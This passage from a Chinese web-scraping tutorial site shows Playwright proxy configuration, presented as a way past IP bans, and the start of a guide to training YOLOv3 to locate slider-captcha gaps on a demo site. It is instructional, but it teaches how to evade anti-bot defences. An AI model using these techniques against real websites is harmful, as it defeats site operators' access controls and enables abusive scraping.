                  <h2 id="8-Playwright-的代理设置"><a href="#8-Playwright-的代理设置" class="headerlink" title="8. Playwright 的代理设置"></a>8. Playwright 的代理设置</h2>
                  <p>相对 Selenium 和 Pyppeteer 来说，Playwright 的代理设置更加方便，其预留了一个 proxy 参数，可以在启动 Playwright 的时候设置。</p>
                  <p>对于 HTTP 代理来说，可以这样设置：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">from</span> playwright.sync_api <span class="keyword">import</span> sync_playwright</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> sync_playwright() <span class="keyword">as</span> p:</span><br><span class="line">    browser = p.chromium.launch(proxy=&#123;</span><br><span class="line">        <span class="string">'server'</span>: <span class="string">'http://127.0.0.1:7890'</span></span><br><span class="line">    &#125;)</span><br><span class="line">    page = browser.new_page()</span><br><span class="line">    page.goto(<span class="string">'https://httpbin.org/get'</span>)</span><br><span class="line">    print(page.content())</span><br><span class="line">    browser.close()</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>在调用 launch 方法的时候，我们可以传一个 proxy 参数，是一个字典。字典有一个必填的字段叫做 server，这里我们可以直接填写 HTTP 代理的地址即可。</p>
                  <p>运行结果如下：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"args"</span>: &#123;&#125;,</span><br><span class="line">  <span class="attr">"headers"</span>: &#123;</span><br><span class="line">    <span class="attr">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"</span>,</span><br><span class="line">    <span class="attr">"Accept-Encoding"</span>: <span class="string">"gzip, deflate, br"</span>,</span><br><span class="line">    <span class="attr">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.9"</span>,</span><br><span class="line">    <span class="attr">"Host"</span>: <span class="string">"httpbin.org"</span>,</span><br><span class="line">    <span class="attr">"Sec-Ch-Ua"</span>: <span class="string">"\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"92\""</span>,</span><br><span class="line">    <span class="attr">"Sec-Ch-Ua-Mobile"</span>: <span class="string">"?0"</span>,</span><br><span class="line">    <span class="attr">"Sec-Fetch-Dest"</span>: <span class="string">"document"</span>,</span><br><span class="line">    <span class="attr">"Sec-Fetch-Mode"</span>: <span class="string">"navigate"</span>,</span><br><span class="line">    <span class="attr">"Sec-Fetch-Site"</span>: <span class="string">"none"</span>,</span><br><span class="line">    <span class="attr">"Sec-Fetch-User"</span>: <span class="string">"?1"</span>,</span><br><span class="line">    <span class="attr">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>,</span><br><span class="line">    <span class="attr">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4498.0 Safari/537.36"</span>,</span><br><span class="line">    <span class="attr">"X-Amzn-Trace-Id"</span>: <span class="string">"Root=1-60e99eef-4fa746a01a38abd469ecb467"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"origin"</span>: <span class="string">"210.173.1.204"</span>,</span><br><span class="line">  <span class="attr">"url"</span>: <span class="string">"https://httpbin.org/get"</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>对于 SOCKS 代理，设置方法也是完全一样的，我们只需要把 server 字段的值换成 SOCKS 代理的地址即可：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">from</span> playwright.sync_api <span class="keyword">import</span> sync_playwright</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> sync_playwright() <span class="keyword">as</span> p:</span><br><span class="line">    browser = p.chromium.launch(proxy=&#123;</span><br><span class="line">        <span class="string">'server'</span>: <span class="string">'socks5://127.0.0.1:7891'</span></span><br><span class="line">    &#125;)</span><br><span class="line">    page = browser.new_page()</span><br><span class="line">    page.goto(<span class="string">'https://httpbin.org/get'</span>)</span><br><span class="line">    print(page.content())</span><br><span class="line">    browser.close()</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>运行结果和刚才也是完全一样的。</p>
                  <p>对于有用户名和密码的代理，Playwright 的设置也非常简单，我们只需要在 proxy 参数额外设置 username 和 password 字段即可，假如用户名和密码分别是 foo 和 bar，则设置方法如下：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">from</span> playwright.sync_api <span class="keyword">import</span> sync_playwright</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> sync_playwright() <span class="keyword">as</span> p:</span><br><span class="line">    browser = p.chromium.launch(proxy=&#123;</span><br><span class="line">        <span class="string">'server'</span>: <span class="string">'http://127.0.0.1:7890'</span>,</span><br><span class="line">        <span class="string">'username'</span>: <span class="string">'foo'</span>,</span><br><span class="line">        <span class="string">'password'</span>: <span class="string">'bar'</span></span><br><span class="line">    &#125;)</span><br><span class="line">    page = browser.new_page()</span><br><span class="line">    page.goto(<span class="string">'https://httpbin.org/get'</span>)</span><br><span class="line">    print(page.content())</span><br><span class="line">    browser.close()</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这样我们就能非常方便地为 Playwright 实现认证代理的设置。</p>
                  <h2 id="9-总结"><a href="#9-总结" class="headerlink" title="9.总结"></a>9.总结</h2>
                  <p>以上我们就总结了各个请求库的代理使用方式，各种库的设置方法大同小异，学会了这些方法之后，以后如果遇到封 IP 的问题，我们可以轻松通过加代理的方式来解决。</p>
                  <p>本节代码：<a href="https://github.com/Python3WebSpider/ProxyTest" target="_blank" rel="noopener">https://github.com/Python3WebSpider/ProxyTest</a></p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2022-03-03 11:42:44" itemprop="dateCreated datePublished" datetime="2022-03-03T11:42:44+08:00">2022-03-03</time>
                </span>
                <span id="/2022102.html" class="post-meta-item leancloud_visitors" data-flag-title="【2022 年】Python3 爬虫教程 - 代理的使用方法" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>15k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>13 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/202293.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> Python <i class="label-arrow"></i>
                  </a>
                  <a href="/202293.html" class="post-title-link" itemprop="url">【2022 年】Python3 爬虫教程 - 深度学习识别滑动验证码缺口</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <blockquote>
                    <p>爬虫系列文章总目录：<a href="https://cuiqingcai.com/17777.html">【2022 年】Python3 爬虫学习教程</a>，本教程内容多数来自于《Python3 网络爬虫开发实战（第二版）》一书，目前截止 2022 年，可以将爬虫基本技术进行系统讲解，同时将最新前沿爬虫技术如异步、JavaScript 逆向、AST、安卓逆向、Hook、智能解析、群控技术、WebAssembly、大规模分布式、Docker、Kubernetes 等，市面上目前就仅有<a href="https://item.jd.com/13527222.html" target="_blank" rel="noopener">《Python3 网络爬虫开发实战（第二版）》</a>一书了，<a href="https://item.jd.com/13527222.html" target="_blank" rel="noopener">点击了解详情</a>。</p>
                  </blockquote>
                  <p>上一节我们使用 OpenCV 识别了图形验证码躯壳欧。这时候就有朋友可能会说了，现在深度学习不是对图像识别很准吗？那深度学习可以用在识别滑动验证码缺口位置吗？</p>
                  <p>当然也是可以的，本节我们就来了解下使用深度学习识别滑动验证码的方法。</p>
                  <h2 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1. 准备工作"></a>1. 准备工作</h2>
                  <p>同样地，本节还是主要侧重于完成利用深度学习模型来识别验证码缺口的过程，所以不会侧重于讲解深度学习模型的算法，另外由于整个模型实现较为复杂，本节也不会从零开始编写代码，而是倾向于把代码提前下载下来进行实操练习。</p>
                  <p>所以在最后，请提前代码下载下来，仓库地址为：<a href="https://github.com/Python3WebSpider/DeepLearningSlideCaptcha2，利用" target="_blank" rel="noopener">https://github.com/Python3WebSpider/DeepLearningSlideCaptcha2，利用</a> Git 把它克隆下来：</p>
                  <figure class="highlight crmsh">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/Python3WebSpider/DeepLearningSlideCaptcha2.git</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>运行完毕之后，本地就会出现一个 DeepLearningImageCaptcha2 的文件夹，就证明克隆成功了。</p>
                  <p>克隆完毕之后，请切换到 DeepLearningImageCaptcha2 文件夹，安装必要的依赖库：</p>
                  <figure class="highlight cmake">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">pip3 <span class="keyword">install</span> -r requirements.txt</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>运行完毕之后，本项目运行所需要的依赖库就全部安装好了。</p>
                  <p>以上准备工作都完成之后，那就让我们就开始本节正式的学习吧。</p>
                  <h2 id="2-目标检测"><a href="#2-目标检测" class="headerlink" title="2. 目标检测"></a>2. 目标检测</h2>
                  <p>识别滑动验证码缺口的这个问题，其实可以归结为目标检测问题。那什么叫目标检测呢？在这里简单作下介绍。</p>
                  <p>目标检测，顾名思义，就是把我们想找的东西找出来。比如给一张「狗」的图片，如图所示：</p>
                  <p><img src="https://cdn.cuiqingcai.com/4fre2.png" alt="image-20191107024841075"></p>
                  <p>我们想知道这只狗在哪，它的舌头在哪，找到了就把它们框选出来，这就是目标检测。</p>
                  <p>经过目标检测算法处理之后，我们期望得到的图片是这样的：</p>
                  <p><img src="https://cdn.cuiqingcai.com/i867f.png" alt="image-20191107025008947"></p>
                  <p>可以看到这只狗和它的舌头就被框选出来了，这就完成了一个不错的目标检测。</p>
                  <p>现在比较流行的目标检测算法有 R-CNN、Fast R-CNN、Faster R-CNN、SSD、YOLO 等，感兴趣可以了解一下，当然不太了解对本节要完成的目标也没有什么影响。</p>
                  <p>当前做目标检测的算法主要有两种方法，有一阶段式和两阶段式，英文叫做 One stage 和 Two stage，简述如下：</p>
                  <ul>
                    <li>Two Stage：算法首先生成一系列目标所在位置的候选框，然后再对这些框选出来的结果进行样本分类，即先找出来在哪，然后再分出来是啥，俗话说叫「看两眼」，这种算法有 R-CNN、Fast R-CNN、Faster R-CNN 等，这些算法架构相对复杂，但准确率上有优势。</li>
                    <li>One Stage：不需要产生候选框，直接将目标定位和分类的问题转化为回归问题，俗话说叫「看一眼」，这种算法有 YOLO、SSD，这些算法虽然准确率上不及 Two stage，但架构相对简单，检测速度更快。</li>
                  </ul>
                  <p>所以这次我们选用 One Stage 的有代表性的目标检测算法 YOLO 来实现滑动验证码缺口的识别。</p>
                  <p>YOLO，英文全称叫做 You Only Look Once，取了它们的首字母就构成了算法名，</p>
                  <p>目前 YOLO 算法最新的版本是 V5 版本，应用比较广泛的是 V3 版本，这里算法的具体流程我们就不过多介绍了，感兴趣的可以搜一下相关资料了解下，另外也可以了解下 YOLO V1-V3 版本的不同和改进之处，这里列几个参考链接：</p>
                  <ul>
                    <li>YOLO V3 论文：<a href="https://pjreddie.com/media/files/papers/YOLOv3.pdf" target="_blank" rel="noopener">https://pjreddie.com/media/files/papers/YOLOv3.pdf</a></li>
                    <li>YOLO V3 介绍：<a href="https://zhuanlan.zhihu.com/p/34997279" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/34997279</a></li>
                    <li>YOLO V1-V3 对比介绍：<a href="https://www.cnblogs.com/makefile/p/yolov3.html" target="_blank" rel="noopener">https://www.cnblogs.com/makefile/p/yolov3.html</a></li>
                  </ul>
                  <h2 id="3-数据准备"><a href="#3-数据准备" class="headerlink" title="3. 数据准备"></a>3. 数据准备</h2>
                  <p>像上一节介绍的一样，要训练深度学习模型也需要准备训练数据，数据也是分为两部分，一部分是验证码图像，另一部分是数据标注，即缺口的位置。但和上一节不一样的是，这次标注不再是单纯的验证码文本了，因为这次我们需要表示的是缺口的位置，缺口对应的是一个矩形框，要表示一个矩形框，至少需要四个数据，如左上角点的横纵坐标 x、y，矩形的宽高 w、h，所以标注数据就变成了四个数字。</p>
                  <p>所以，接下来我们就需要准备一些验证码图片和对应的四位数字的标注了，比如下图的滑动验证码：</p>
                  <p><img src="https://cdn.cuiqingcai.com/9s7ms.png" alt=""></p>
                  <p>好，那接下来我们就完成这两步吧，第一步就是收集验证码图片，第二步就是标注缺口的位置并转为我们想要的四位数字。</p>
                  <p>在这里我们的示例网站是 <a href="https://captcha1.scrape.center/，打开之后点击登录按钮便会弹出一个滑动验证码，如图所示：" target="_blank" rel="noopener">https://captcha1.scrape.center/，打开之后点击登录按钮便会弹出一个滑动验证码，如图所示：</a></p>
                  <p><img src="https://cdn.cuiqingcai.com/b0tqg.png" alt="image-20210504182925384"></p>
                  <p>我们需要做的就是单独将滑动验证码的图像保存下来，也就是这个区域：</p>
                  <p><img src="https://cdn.cuiqingcai.com/3ihk2.png" alt="image-20210504183039997"></p>
                  <p>怎么做呢？靠手工截图肯定不太可靠，费时费力，而且不好准确定位边界，会导致存下来的图片有大有小。为了解决这个问题，我们可以简单写一个脚本来实现下自动化裁切和保存，就是仓库中的 collect.py 文件，代码如下：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"><span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> WebDriverException</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line"></span><br><span class="line">COUNT = <span class="number">1000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, COUNT + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        browser = webdriver.Chrome()</span><br><span class="line">        wait = WebDriverWait(browser, <span class="number">10</span>)</span><br><span class="line">        browser.get(<span class="string">'https://captcha1.scrape.center/'</span>)</span><br><span class="line">        button = wait.until(EC.element_to_be_clickable(</span><br><span class="line">            (By.CSS_SELECTOR, <span class="string">'.el-button'</span>)))</span><br><span class="line">        button.click()</span><br><span class="line">        captcha = wait.until(</span><br><span class="line">            EC.presence_of_element_located((By.CSS_SELECTOR, <span class="string">'.geetest_slicebg.geetest_absolute'</span>)))</span><br><span class="line">        time.sleep(<span class="number">5</span>)</span><br><span class="line">        captcha.screenshot(<span class="string">f'data/captcha/images/captcha_<span class="subst">&#123;i&#125;</span>.png'</span>)</span><br><span class="line">    <span class="keyword">except</span> WebDriverException <span class="keyword">as</span> e:</span><br><span class="line">        logger.error(<span class="string">f'webdriver error occurred <span class="subst">&#123;e.msg&#125;</span>'</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        browser.close()</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>在这里我们先定义了一个循环，循环次数为 COUNT 次，每次循环都使用 Selenium 启动一个浏览器，然后打开目标网站，模拟点击登录按钮触发验证码弹出，然后截取验证码对应的节点，再用 screenshot 方法将其保存下来。</p>
                  <p>我们将其运行：</p>
                  <figure class="highlight vim">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">python3</span> collect.<span class="keyword">py</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>运行完了之后我们就可以在 <code>data/captcha/images/</code> 目录获得很多验证码图片了，样例如图所示：</p>
                  <p><img src="https://cdn.cuiqingcai.com/plwov.png" alt="image-20210504194022826"></p>
                  <p>获得验证码图片之后，我们就需要进行数据标注了，这里推荐的工具是 labelImg，GitHub 地址为 <a href="https://github.com/tzutalin/labelImg，使用" target="_blank" rel="noopener">https://github.com/tzutalin/labelImg，使用</a> pip3 安装即可：</p>
                  <figure class="highlight cmake">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">pip3 <span class="keyword">install</span> labelImg</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>安装完成之后可以直接命令行运行：</p>
                  <figure class="highlight ebnf">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="attribute">labelImg</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这样就成功启动了 labelImg：</p>
                  <p><img src="https://cdn.cuiqingcai.com/sagzl.png" alt="image-20210504194644729"></p>
                  <p>点击 <code>Open Dir</code> 打开 <code>data/captcha/images/</code> 目录，然后点击左下角的 <code>Create RectBox</code> 创建一个标注框，我们可以将缺口所在的矩形框框选出来，框选完毕之后 labelImg 就会提示保存一个名称，我们将其命名为 target，然后点击 OK，如图所示：</p>
                  <p><img src="https://cdn.cuiqingcai.com/1eqpy.png" alt="image-20210504194608969"></p>
                  <p>这时候我们可以发现其保存了一个 xml 文件，内容如下：</p>
                  <figure class="highlight xml">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="tag">&lt;<span class="name">annotation</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">folder</span>&gt;</span>images<span class="tag">&lt;/<span class="name">folder</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">filename</span>&gt;</span>captcha_0.png<span class="tag">&lt;/<span class="name">filename</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">path</span>&gt;</span>data/captcha/images/captcha_0.png<span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">source</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">database</span>&gt;</span>Unknown<span class="tag">&lt;/<span class="name">database</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">size</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">width</span>&gt;</span>520<span class="tag">&lt;/<span class="name">width</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">height</span>&gt;</span>320<span class="tag">&lt;/<span class="name">height</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">depth</span>&gt;</span>3<span class="tag">&lt;/<span class="name">depth</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">segmented</span>&gt;</span>0<span class="tag">&lt;/<span class="name">segmented</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">object</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>target<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">pose</span>&gt;</span>Unspecified<span class="tag">&lt;/<span class="name">pose</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">truncated</span>&gt;</span>0<span class="tag">&lt;/<span class="name">truncated</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">difficult</span>&gt;</span>0<span class="tag">&lt;/<span class="name">difficult</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">bndbox</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">xmin</span>&gt;</span>321<span class="tag">&lt;/<span class="name">xmin</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">ymin</span>&gt;</span>87<span class="tag">&lt;/<span class="name">ymin</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">xmax</span>&gt;</span>407<span class="tag">&lt;/<span class="name">xmax</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">ymax</span>&gt;</span>167<span class="tag">&lt;/<span class="name">ymax</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">bndbox</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">annotation</span>&gt;</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>其中可以看到 size 节点里有三个节点，分别是 width、height、depth，分别代表原验证码图片的宽度、高度、通道数。另外 object 节点下的 bndbox 节点就包含了标注缺口的位置，通过观察对比可以知道 xmin、ymin 指的就是左上角的坐标，xmax、ymax 指的就是右下角的坐标。</p>
                  <p>我们可以用下面的方法简单进行下数据处理：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> xmltodict</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_xml</span><span class="params">(file)</span>:</span></span><br><span class="line">    xml_str = open(file, encoding=<span class="string">'utf-8'</span>).read()</span><br><span class="line">    data = xmltodict.parse(xml_str)</span><br><span class="line">    data = json.loads(json.dumps(data))</span><br><span class="line">    annoatation = data.get(<span class="string">'annotation'</span>)</span><br><span class="line">    width = int(annoatation.get(<span class="string">'size'</span>).get(<span class="string">'width'</span>))</span><br><span class="line">    height = int(annoatation.get(<span class="string">'size'</span>).get(<span class="string">'height'</span>))</span><br><span class="line">    bndbox = annoatation.get(<span class="string">'object'</span>).get(<span class="string">'bndbox'</span>)</span><br><span class="line">    box_xmin = int(bndbox.get(<span class="string">'xmin'</span>))</span><br><span class="line">    box_xmax = int(bndbox.get(<span class="string">'xmax'</span>))</span><br><span class="line">    box_ymin = int(bndbox.get(<span class="string">'ymin'</span>))</span><br><span class="line">    box_ymax = int(bndbox.get(<span class="string">'ymax'</span>))</span><br><span class="line">    box_width = (box_xmax - box_xmin) / width</span><br><span class="line">    box_height = (box_ymax - box_ymin) / height</span><br><span class="line">    <span class="keyword">return</span> box_xmin / width, box_ymin / height, box_width / width, box_height / height</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里我们定义了一个 parse_xml 方法，这个方法首先读取了 xml 文件，然后使用 xmltodict 库就可以将 XML 字符串转为 JSON，然后依次读取出验证码的宽高信息，缺口的位置信息，最后返回了想要的数据格式—— 缺口左上角的坐标和宽高相对值，以元组的形式返回。</p>
                  <p>都标注完成之后，对每个 xml 文件调用此方法便可以生成想要的标注结果了。</p>
                  <p>在这里，我已经将对应的标注结果都处理好了，可以直接使用，路径为 data/captcha/labels，如图所示：</p>
                  <p><img src="https://cdn.cuiqingcai.com/j358p.png" alt="image-20210504200730482"></p>
                  <p>每个 txt 文件对应一张验证码图的标注结果，内容类似如下：</p>
                  <figure class="highlight basic">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="symbol">0 </span><span class="number">0.6153846153846154</span> <span class="number">0.275</span> <span class="number">0.16596774</span> <span class="number">0.24170968</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>第一位 0 代表标注目标的索引，由于我们只需要检测一个缺口，所以索引就是 0；第 2、3 位代表缺口的左上角的位置，比如 0.615 则代表缺口左上角的横坐标在相对验证码的 61.5% 处，乘以验证码的宽度 520，结果大约就是 320，即左上角偏移值是 320 像素；第 4、5 代表缺口的宽高相对验证码图片的占比，比如第 5 位 0.24 乘以验证码的高度 320，结果大约是 77，即缺口的高度大约为 77 像素。</p>
                  <p>好了，到此为止数据准备阶段就完成了。</p>
                  <h2 id="4-训练"><a href="#4-训练" class="headerlink" title="4. 训练"></a>4. 训练</h2>
                  <p>为了更好的训练效果，我们还需要下载一些预训练模型。预训练的意思就是已经有一个提前训练过的基础模型了，我们可以直接使用提前训练好的模型里面的权重文件，我们就不用从零开始训练了，只需要基于之前的模型进行微调就好了，这样既可以节省训练时间，又可以有比较好的效果。</p>
                  <p>YOLOV3 的训练要加载预训练模型才能有不错的训练效果，预训练模型下载命令如下：</p>
                  <figure class="highlight arduino">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">bash <span class="built_in">prepare</span>.sh</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <blockquote>
                    <p>注意：在 Windows 下请使用 Bash 命令行工具如 Git Bash 来运行此命令。</p>
                  </blockquote>
